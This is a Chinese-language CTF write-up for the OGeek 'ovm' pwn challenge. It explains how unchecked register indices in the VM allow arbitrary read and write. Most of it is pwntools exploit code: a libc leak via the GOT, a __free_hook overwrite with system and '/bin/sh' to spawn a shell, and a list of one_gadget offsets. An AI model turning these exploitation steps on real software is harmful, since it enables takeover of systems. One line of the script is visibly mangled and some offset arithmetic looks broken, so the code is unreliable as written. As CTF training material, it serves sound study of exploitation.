    # d("b *0x00000000004019FD \n")
    p.sendlineafter('name:\n','/bin/sh')
    ins = "push push save push load push add push save"
    p.sendlineafter('instruction:\n', ins)
    offset = -(libc.sym['puts'] - libc.sym['system'])
    data_addr=0x000000000404088
    data = [data_addr,-3,-12 ,offset ,-12]
    payload=""
    for i in data:
        payload+=str(i)+" "
    # d('b *0x0000000000401A75\nb *0x00000000004019C7\nb*0x0000000000401A5D\n')
    p.sendlineafter('data:\n',payload)
    p.interactive()
### Ogeek 线下pwn
#### 题目分析
程序刚开始 先初始化基础值
然后队 memory 赋值
赋值结束 因为 running = 1  
所以进入一个 while 循环 依次进行我们输入的 指令的操作
##### fetch() 函数
相当于依次获得 memory 数组中存放的 函数指令  
reg[15] --> idx
获得指令后 进入 `execute(memory[rep[15]])`
##### execute() 函数
函数对应所有的指令操作  
将输入的 4 字节分成 4组  
操作指令 | 参数c | 参数b | 参数a
**对应值对应的操作**
> 0x10 --> reg[c] = memory  
>  0x20 --> reg[c] = memory == 0  
>  0x30 --> reg[c] = ::memory[reg[a]]  
>  0x40 --> ::memory[reg[a]] = reg[c] // 存在任意写  
>  0x50 --> stack[reg[13]++] = reg[c]  
>  0x60 --> reg[c] = stack[--reg[13]] // 存在任意读  
>  0x70 --> reg[c] = reg[a] + reg[b]  
>  0x80 --> reg[c] = reg[b] - reg[a]  
>  0x90 --> reg[c] = reg[a] & reg[b]  
>  0xA0 --> reg[c] = reg[a] | reg[b]  
>  0xB0 --> reg[c] = reg[a] ^ reg[b]  
>  0xC0 --> reg[c] = reg[b]   0xD0 --> reg[c] = reg[b] >> reg[a]  
>  0xE0 --> running = 0  
>  0xFF --> running = 0 打印 reg[] 数组中的 所有值
reg[13] = sp (无符号数)  
reg[15] = pc (无符号数) --> 指令存储的 memory 的起始位置
因为没有验证 数组的偏移多少  
所有我们 可以想办法 构造 数组的 下标为 负数，从而向上读，可以读取到  
got表中的值，让通过指令将 得到的 值保存到一个寄存器中
我们对应的 寄存器 reg[10] 对应的是 dd DWORD 型的
因为我们的 程序是 64位的  
但是这个 寄存器保存值只能保存 4 字节  
想要保存 8 字节的值 我们需要用到两个寄存器。
我们直接用 赋值操作 + 移位 将这个  
0x60 操作下的 reg[13] 的值转化为 负数然后保存在对应的寄存器中
通过这个 方法我们可以实现任意读和任意写，  
然后要做的 就是想办法去利用它  
首先想到的是 得到libc 然后任意写，有个很巧妙的办法  
就是 将最后
comment[0] 指针 覆盖为 一个地方 这样 我们 reg 寄存器中存在值在 退出打印的时候可以的得到libc  
然后最后的 read 又能 覆盖comment[0] 这个地址保存值  
从而 得到shell  
有个方法就是  
我们可以修改 comment[0] 指针指向 `free_hook -0x8` 从而可以先 写入 `/bin/sh\x00 + p64(system)`  
这样最后free(comment[0]) 的时候就能 执行 system("/bin/sh\x00")
**修改前**
**修改后**
修改 free_hook
布置 “/bin/sh\x00”参数
    from pwn import *
    context.log_level = 'debug'
    exe = './ovm'
    elf = ELF(exe)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    def d(s=''):
        gdb.attach(p, s)
    def pwn():
        read_offset = libc.sym['read']
        system_offset = libc.sym['system']
        __free_hook_offset = libc.sym['__free_hook']
        offset_free_hook_2_read = __free_hook_offset - read_offset
        offset_system_2_read = system_offset - read_offset
        one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
        code = [
            0x100d0001, #   reg[13] = 1
            0x10010008, #   reg[0] = 8
            0xc00d0d01, #   reg[13] = 1 0x100
            0xc00d0d01, #   reg[13] = 0x100 0x10000
            0x1001003e, #   reg[1] = 0x3e 
            0x700d0d01, #   reg[13] = reg[13] + reg[1] = 0x1003e
            0x10010000, #   reg[1] = 0
            0x800D010D, #   reg[13] = reg[1] - reg[13] = 0 - 0x1003e = 0xffc2  ----> -0x3e
                        #   stack[-0x3e] = read_got+0x8
            0x60030000, #   reg[3] = read_got_high_int
            0x60040000, #   reg[4] = read_got_low_int
            0x10020008, #   reg[2] = 8
            0x10050000+((offset_free_hook_2_read>>16)),         #   reg[5] = offset_system_2_read_high
            0x10060000+(0x10000-(offset_free_hook_2_read>>8)%100-2),
            0xc0050502, #   reg[5] = reg[5]  free_hook-8
            0x80020002, # reg[2] = -8
            0x40040002, # memory[-8] =  __free_hook - 8 _low
            0x10020007,
            0x80020002,
            0x40030002, # memory[-9] = _free_hook - 8 _high
            0xff000000
        ]
        p.sendlineafter("PCPC: ", '0')
        p.sendlineafter("SP: ", '0')
        p.sendlineafter("CODE SIZE: ", str(len(code)))
        # d()
        for i in code:
            sleep(0.1)
            p.sendline(str(i))
        # d()
        success("read_offset-->"+hex(read_offset))
        success("offset_free_hook_2_read-->"+hex(offset_free_hook_2_read))
        p.recvuntil("R3: ")
        free_hook = int(p.recv(4),16)"+hex(free_hook))
        libc_base = free_hook - __free_hook_offset
        system = libc.sym['system'] + libc_base
        success("system-->"+hex(system))
        p.sendlineafter("HOW DO YOU FEEL AT OVM?",'/bin/sh\x00'+p64(system))
        p.interactive()
    if __name__ == '__main__':
        p = process(exe)
        pwn()
        '''one
        0x45216 execve("/bin/sh", rsp+0x30, environ)
        constraints:
          rax == NULL
        0x4526a execve("/bin/sh", rsp+0x30, environ)
        constraints:
          [rsp+0x30] == NULL
        0xf02a4 execve("/bin/sh", rsp+0x50, environ)
        constraints:
          [rsp+0x50] == NULL
        0xf1147 execve("/bin/sh", rsp+0x70, environ)
        constraints:
          [rsp+0x70] == NULL
        '''